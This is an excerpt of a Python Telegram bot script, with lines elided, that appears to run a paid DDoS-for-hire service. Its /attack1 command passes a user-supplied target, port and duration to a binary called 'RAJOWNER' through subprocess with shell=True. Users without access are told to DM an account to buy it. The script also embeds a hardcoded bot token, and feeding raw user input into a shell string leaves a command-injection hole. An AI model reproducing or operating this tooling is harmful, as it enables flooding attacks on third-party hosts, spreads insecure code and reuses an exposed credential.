...
bot = telebot.TeleBot('7681238618:AAHJ5Y1DPJ4UWJpfj215f1SgFfE3cYghyk0')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./RAJOWNER {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"RAJOWNER 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY RAJOWNER"
        else:
            response = "Usage :- /attack1 <target> <port> <time>\nBy RAJOWNER"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @RAJOWNER90"
